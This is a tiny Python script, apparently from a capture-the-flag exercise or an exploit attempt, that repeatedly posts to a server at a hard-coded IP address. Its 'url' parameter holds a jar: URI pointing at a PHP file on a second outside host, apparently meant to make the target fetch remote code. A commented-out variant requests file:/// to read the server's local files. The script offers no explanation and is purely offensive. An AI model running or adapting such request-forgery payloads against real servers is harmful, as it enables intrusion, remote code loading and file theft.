#!/usr/bin/env python
from requests import *

URL = 'http://54.250.204.28/'

while True:
    o = post( URL , data = {'url':'jar:60.251.236.17/a.php.jar!/a.php'} )
#o = post( URL , data = {'url':'file:///'} )

#print o.content

